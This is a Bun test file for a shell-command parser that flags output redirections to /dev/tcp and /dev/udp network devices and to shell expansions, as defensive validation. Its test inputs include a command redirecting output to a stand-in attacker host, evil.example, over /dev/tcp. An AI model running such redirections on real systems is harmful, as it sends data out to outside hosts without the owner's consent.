import { describe, expect, test } from 'bun:test'

import { extractOutputRedirections } from '../commands.js'

describe('extractOutputRedirections — /dev/tcp network devices', () => {
  test('flags `> /dev/tcp/host/port` as a network device', () => {
    const result = extractOutputRedirections('echo hi > /dev/tcp/evil.example/443')
    expect(result.hasDangerousRedirection).toBe(true)
    expect(result.dangerousRedirectionReason).toBe('network_device')
    // The device is dropped from redirections — there is no filesystem path to validate.
    expect(result.redirections).toEqual([])
  })

  test('flags `> /dev/udp/host/port` as a network device', () => {
    const result = extractOutputRedirections('echo hi > /dev/udp/8.8.8.8/53')
    expect(result.hasDangerousRedirection).toBe(true)
    expect(result.dangerousRedirectionReason).toBe('network_device')
  })

  test('flags fd redirect to a network device', () => {
    const result = extractOutputRedirections('echo hi 2> /dev/tcp/host/80')
    expect(result.hasDangerousRedirection).toBe(true)
    expect(result.dangerousRedirectionReason).toBe('network_device')
  })

  test('leaves ordinary file redirects untouched', () => {
    const result = extractOutputRedirections('echo hi > out.txt')
    expect(result.hasDangerousRedirection).toBe(false)
    expect(result.dangerousRedirectionReason).toBeUndefined()
    expect(result.redirections).toEqual([{ target: 'out.txt', operator: '>' }])
  })

  test('ordinary /dev paths are not network devices', () => {
    const result = extractOutputRedirections('echo hi > /dev/null')
    expect(result.hasDangerousRedirection).toBe(false)
    expect(result.redirections).toEqual([{ target: '/dev/null', operator: '>' }])
  })

  test('shell expansion targets are reported as shell_expansion', () => {
    const result = extractOutputRedirections('echo hi > $HOME/x')
    expect(result.hasDangerousRedirection).toBe(true)
    expect(result.dangerousRedirectionReason).toBe('shell_expansion')
  })
})
